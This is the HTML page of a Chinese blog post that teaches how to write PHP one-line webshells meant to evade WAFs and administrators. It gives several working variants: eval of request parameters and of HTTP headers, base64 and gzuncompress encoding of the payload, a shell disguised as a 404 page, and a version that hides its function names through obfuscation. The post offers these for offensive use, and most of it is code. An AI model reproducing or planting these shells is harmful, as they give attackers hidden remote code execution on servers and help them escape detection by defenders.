<!DOCTYPE html>
<html lang="">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="苍天已死，waf当道。如今常规一句话已经越来越不能满足各位大佬(scriptkids)的欲望了。像什么eval($_POST[xx])简直low爆了，来跟我学新的姿势吧～～"/>




  <meta name="keywords" content="免杀,Shell,php," />





  <link rel="alternate" href="/default" title="Bypass.World">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="http://yoursite.com/2017/01/无特征过狗一句话思路/"/>


<meta name="description" content="苍天已死，waf当道。如今常规一句话已经越来越不能满足各位大佬(scriptkids)的欲望了。像什么eval($_POST[xx])简直low爆了，来跟我学新的姿势吧～～">
<meta name="keywords" content="免杀,Shell,php">
<meta property="og:type" content="article">
<meta property="og:title" content="无特征过狗一句话猥琐思路">
<meta property="og:url" content="http://yoursite.com/2017/01/无特征过狗一句话思路/index.html">
<meta property="og:site_name" content="Bypass.World">
<meta property="og:description" content="苍天已死，waf当道。如今常规一句话已经越来越不能满足各位大佬(scriptkids)的欲望了。像什么eval($_POST[xx])简直low爆了，来跟我学新的姿势吧～～">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/08/589a8d8acbf84.png">
<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/08/589a8de916300.png">
<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/08/589a8e5019390.png">
<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/08/589a8e50e8df5.png">
<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/08/589a8ee4e7fb0.png">
<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/08/589a8f1062324.png">
<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="无特征过狗一句话猥琐思路">
<meta name="twitter:description" content="苍天已死，waf当道。如今常规一句话已经越来越不能满足各位大佬(scriptkids)的欲望了。像什么eval($_POST[xx])简直low爆了，来跟我学新的姿势吧～～">
<meta name="twitter:image" content="https://ooo.0o0.ooo/2017/02/08/589a8d8acbf84.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  <script type="text/javascript">
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-106734017-1', 'auto');
        ga('send', 'pageview');
  </script>



    <title> 无特征过狗一句话猥琐思路 - Bypass.World </title>
  </head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">Bypass.World</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          无特征过狗一句话猥琐思路
        
      </h1>

      <time class="post-time">
          Jan 12 2017
      </time>
    </header>



    
            <div class="post-content">
            <h3 id="0x01、姿势一"><a href="#0x01、姿势一" class="headerlink" title="0x01、姿势一"></a>0x01、姿势一</h3><p>我们知道php动态函数很有意思，那么你猜到了，姿势一就是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $_POST[<span class="string">'xx'</span>]($_POST[<span class="string">'oo'</span>]);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>注意xx参数设置成eval是不行的哦，让我们来看看效果：</p>
<p><img src="https://ooo.0o0.ooo/2017/02/08/589a8d8acbf84.png" alt="QQ20170105-161114@2x.png"></p>
<h3 id="0x02、姿势二"><a href="#0x02、姿势二" class="headerlink" title="0x02、姿势二"></a>0x02、姿势二</h3><p>关键词是过滤了，但是你老是post一些奇奇怪怪的东西，人家几万块买的waf也不是吃白饭的啊。好好好你丑你说什么都是对的，我们不post了，getallheaders函数能够获取请求头内容，来试试新家伙：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(getallheaders()[<span class="string">'Accept-Language'</span>]);&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://ooo.0o0.ooo/2017/02/08/589a8de916300.png" alt="QQ20170105-162643@2x.png"></p>
<p>当然你要是猥琐到这样，那恭喜你，你已经学会举一反三了。。。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $a=getallheaders()[<span class="string">'xxx'</span>];$a(getallheaders()[<span class="string">'ooo'</span>]);&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://ooo.0o0.ooo/2017/02/08/589a8e5019390.png" alt="QQ20170105-163259@2x.png"></p>
<h3 id="0x03、姿势三"><a href="#0x03、姿势三" class="headerlink" title="0x03、姿势三"></a>0x03、姿势三</h3><p>遇到一般的waf可能上个姿势就能 bypass了，但是还是会有一些臭不要脸的waf会检测http请求头里的内容，咱们还是从技术角度出发来看看这个问题怎么绕过，猥琐的人可能首先想到了base64，更猥琐的人可能想到了各种自写函数进行编码、替换，但是我见过最猥琐的思路是gzuncompress和gzcompress函数，话不多说我们先放shell：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(gzuncompress(base64_decode(getallheaders()[<span class="string">'xx'</span>])));&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://ooo.0o0.ooo/2017/02/08/589a8e50e8df5.png" alt="QQ20170105-170359@2x.png"><br>http headers的里面的xx字段看起来像base64编码（其实他就是base64编码），但是解开之后发现是乱码，waf识别不出来里面的内容，哈哈是不是够猥琐呢。。如果你要是还嫌不够猥琐，那么来吧，互相伤害吧：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $xx=gzuncompress(base64_decode(getallheaders()[<span class="string">'xx'</span>]));$xx(gzuncompress(base64_decode(getallheaders()[<span class="string">'oo'</span>])));&gt;</div></pre></td></tr></table></figure></p>
<h3 id="0x04、姿势四"><a href="#0x04、姿势四" class="headerlink" title="0x04、姿势四"></a>0x04、姿势四</h3><p>目前为止，这个shell在传输过程中已经没有任何特征了，但是管理员毕竟是吃白饭的，某日浏览小黄文可能无意间发现你的shell，一堆什么莫名的base64函数和查了半天资料也搞不懂的gzuncompress函数，管理员手一抖说不定就给删了呢，这时候你需要伪装你的shell，伪装成404是个比较安全的方法,为了防止管理员访问shell时出现未提交相应的http header导致php报错，我们再加上if判断，完整的shell如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML <span class="keyword">PUBLIC</span> <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;<span class="number">404</span> Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$xx=getallheaders()[<span class="string">'xx'</span>];</div><div class="line">$oo=getallheaders()[<span class="string">'oo'</span>];</div><div class="line"><span class="keyword">if</span>($xx!=<span class="string">""</span> <span class="keyword">and</span> $oo!=<span class="string">""</span>)&#123;</div><div class="line">  $xx=gzuncompress(base64_decode($xx));$xx(gzuncompress(base64_decode($oo)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://ooo.0o0.ooo/2017/02/08/589a8ee4e7fb0.png" alt="QQ20170105-172857@2x.png"></p>
<h3 id="0x05、姿势五"><a href="#0x05、姿势五" class="headerlink" title="0x05、姿势五"></a>0x05、姿势五</h3><p>可能你厌倦了每次提交数据都需要进行手动编码再提交。技术的目的本身就是机器代替手工，那好用python来写一个我们专属的一句话控制端吧。不过在这之前我们需要再此改进我们的shell，使其变得更加隐蔽，更加实用。最新版的shell如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML <span class="keyword">PUBLIC</span> <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;<span class="number">404</span> Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;<span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//ZUp4THFyVHl5eS9LVGN5ckF3QVZGZ1Av;</span></div><div class="line">$error0=<span class="string">"404_not_found"</span>;</div><div class="line">$error1=<span class="string">"400_not_found"</span>;</div><div class="line">$error2=<span class="string">"302_not_found"</span>;</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">$_=<span class="string">"\x6d\x64\x35"</span>;</div><div class="line">$__=$_($_.$_.$_);</div><div class="line">$header_errors=chr(<span class="number">103</span>).substr($__,<span class="number">14</span>,<span class="number">1</span>).<span class="string">"t"</span>.chr(<span class="number">97</span>).<span class="string">"llh"</span>.substr($__,<span class="number">14</span>,<span class="number">1</span>).<span class="string">"aders"</span>;</div><div class="line">$base_errors=chr(<span class="number">98</span>).<span class="string">"\x61"</span>.chr(<span class="number">115</span>).substr($__,<span class="number">14</span>,<span class="number">1</span>).<span class="string">"6"</span>.<span class="string">"\x34"</span>.<span class="string">"_"</span>.chr(<span class="number">100</span>).<span class="string">"\x65"</span>.<span class="string">"c"</span>.chr(<span class="number">111</span>).<span class="string">"d"</span>.substr($__,<span class="number">14</span>,<span class="number">1</span>);</div><div class="line">$gz_errors=<span class="string">"\x67\x7a"</span>.chr(<span class="number">117</span>).chr(<span class="number">110</span>).<span class="string">"com"</span>.<span class="string">"\x70\x72\x65\x73\x73"</span>;</div><div class="line"><span class="keyword">if</span>($header_errors()[$error1]!=<span class="string">""</span> <span class="keyword">and</span> $header_errors()[$error2]!=<span class="string">""</span>)&#123;</div><div class="line"><span class="keyword">echo</span> $error0;</div><div class="line">$error=$gz_errors($base_errors($base_errors($header_errors()[$error2])));$error($gz_errors($base_errors($base_errors($header_errors()[$error1]))));</div><div class="line"><span class="keyword">echo</span> $error0;&#125;&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>我们看到其实和上个姿势的差别主要是加了一些混淆，像base64、gzuncompress等这些函数都进行了动态组合，更具有迷惑性，另外执行命令前后分别有一次echo进行输出，这主要是方便我们的一句话客户端在获取服务器相应内容后能够利用正则截取真正的执行结果，而不是多了一些其他的html之类的没用的内容。</p>
<p>附下我们客户端的执行效果：<br><img src="https://ooo.0o0.ooo/2017/02/08/589a8f1062324.png" alt="QQ20170105-174458@2x.png"><br>ps：客户端目前只写了个小框架，后面功能稍微完善点之后会放给大家玩的。</p>

            </div>
          

    
      <footer class="post-footer">
		
		<div class="post-tags">
		  
			<a href="/tags/免杀/">免杀</a>
		  
			<a href="/tags/Shell/">Shell</a>
		  
			<a href="/tags/php/">php</a>
		  
		</div>
		

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2017/01/完美解决多说HTTPS问题/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">完美解决多说HTTPS问题</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2016/12/使用Hexo搭建个人博客/">
        <span class="next-text nav-default">使用Hexo搭建个人博客</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        

      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon"><span class="copyright-year">
    
        &copy;
    
        2014 -
    
    2017
    <span class="footer-author">Norman.Chew.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>     Hosted by     <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
    </span>

</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  </body>
</html>
